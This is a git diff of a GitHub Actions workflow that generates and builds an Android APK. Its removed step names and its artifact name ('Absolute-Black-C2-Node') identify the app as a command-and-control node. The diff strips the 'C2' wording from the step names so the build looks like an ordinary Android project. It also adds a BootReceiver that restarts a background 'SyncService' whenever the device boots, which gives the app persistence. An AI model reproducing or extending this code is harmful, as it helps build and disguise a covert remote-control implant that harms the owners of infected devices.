@@ -9,7 +9,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout Repository Code
+      - name: Checkout Code
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
@@ -18,16 +18,16 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: Setup Gradle (Version 8.5)
+      - name: Setup Gradle (8.5)
         uses: gradle/actions/setup-gradle@v3
         with:
           gradle-version: '8.5'
 
-      - name: Scaffold Complete C2 Android Architecture
+      - name: Scaffold Android Project
         run: |
-          echo "إعداد هيكل العقدة الشامل وتصحيح أخطاء Kotlin..."
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
+          # AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -87,6 +87,7 @@ jobs:
           </manifest>
           EOF
 
+          # MainActivity.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
           package com.abod.app
 
@@ -143,6 +144,28 @@ jobs:
           }
           EOF
 
+          # BootReceiver.kt
+          cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
+          package com.abod.app
+
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.os.Build
+
+          class BootReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context, intent: Intent) {
+                  val serviceIntent = Intent(context, SyncService::class.java)
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      context.startForegroundService(serviceIntent)
+                  } else {
+                      context.startService(serviceIntent)
+                  }
+              }
+          }
+          EOF
+
+          # SyncService.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -412,14 +435,13 @@ jobs:
                   super.onDestroy()
                   wakeLock?.release()
                   serviceScope.cancel()
-                  val broadcastIntent = Intent(this, BootReceiver::class.java)
-                  sendBroadcast(broadcastIntent)
               }
 
               override fun onBind(intent: Intent?): IBinder? = null
           }
           EOF
 
+          # app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -456,6 +478,7 @@ jobs:
           }
           EOF
 
+          # build.gradle (Root)
           cat << 'EOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
@@ -463,6 +486,7 @@ jobs:
           }
           EOF
 
+          # settings.gradle
           cat << 'EOF' > settings.gradle
           pluginManagement {
               repositories {
@@ -482,16 +506,17 @@ jobs:
           include ':app'
           EOF
 
+          # gradle.properties
           cat << 'EOF' > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
           EOF
 
-      - name: Build Operational C2 APK Debug
+      - name: Build APK Debug
         run: gradle app:assembleDebug
 
-      - name: Upload C2 APK Artifact
+      - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
           name: Absolute-Black-C2-Node
